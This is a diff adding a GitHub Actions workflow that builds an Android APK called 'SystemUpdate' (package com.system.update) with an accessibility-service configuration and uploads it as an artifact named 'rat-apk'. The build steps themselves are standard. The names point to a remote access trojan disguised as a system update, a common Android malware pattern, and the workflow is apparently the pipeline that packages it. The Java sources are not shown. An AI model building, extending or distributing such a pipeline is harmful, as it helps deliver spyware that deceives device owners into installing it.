@@ -1,0 +1,112 @@
+name: Build APK
+
+on:
+  push:
+    branches: [ main ]
+  workflow_dispatch:
+
+jobs:
+  build:
+    runs-on: ubuntu-latest
+
+    steps:
+      - name: Checkout code
+        uses: actions/checkout@v4
+
+      - name: Set up JDK 17
+        uses: actions/setup-java@v4
+        with:
+          distribution: 'temurin'
+          java-version: '17'
+
+      - name: Set up Android SDK
+        uses: android-actions/setup-android@v3
+
+      - name: Install Android SDK components
+        run: |
+          sdkmanager "platforms;android-34"
+          sdkmanager "build-tools;34.0.0"
+
+      - name: Create Gradle wrapper
+        run: |
+          mkdir -p app/src/main/java/com/system/update
+          mkdir -p app/src/main/res/xml
+          mkdir -p app/src/main/res/values
+          cp *.java app/src/main/java/com/system/update/
+          cp AndroidManifest.xml app/src/main/
+          cp accessibility_config.xml app/src/main/res/xml/
+          cp strings.xml app/src/main/res/values/
+
+      - name: Create build.gradle
+        run: |
+          cat > build.gradle << 'EOF'
+          buildscript {
+              repositories {
+                  google()
+                  mavenCentral()
+              }
+              dependencies {
+                  classpath 'com.android.tools.build:gradle:8.2.0'
+              }
+          }
+          allprojects {
+              repositories {
+                  google()
+                  mavenCentral()
+              }
+          }
+          EOF
+
+          cat > settings.gradle << 'EOF'
+          rootProject.name = "SystemUpdate"
+          include ':app'
+          EOF
+
+          mkdir -p app
+          cat > app/build.gradle << 'EOF'
+          plugins {
+              id 'com.android.application'
+          }
+          android {
+              namespace 'com.system.update'
+              compileSdk 34
+              defaultConfig {
+                  applicationId "com.system.update"
+                  minSdk 24
+                  targetSdk 34
+                  versionCode 1
+                  versionName "1.0"
+              }
+              buildTypes {
+                  release {
+                      minifyEnabled false
+                  }
+              }
+              compileOptions {
+                  sourceCompatibility JavaVersion.VERSION_17
+                  targetCompatibility JavaVersion.VERSION_17
+              }
+          }
+          dependencies {
+          }
+          EOF
+
+          cat > gradle.properties << 'EOF'
+          android.useAndroidX=true
+          android.enableJetifier=true
+          EOF
+
+      - name: Create gradle wrapper
+        run: |
+          gradle wrapper --gradle-version 8.2
+
+      - name: Build APK
+        run: |
+          chmod +x gradlew
+          ./gradlew assembleDebug
+
+      - name: Upload APK
+        uses: actions/upload-artifact@v4
+        with:
+          name: rat-apk
+          path: app/build/outputs/apk/debug/app-debug.apk
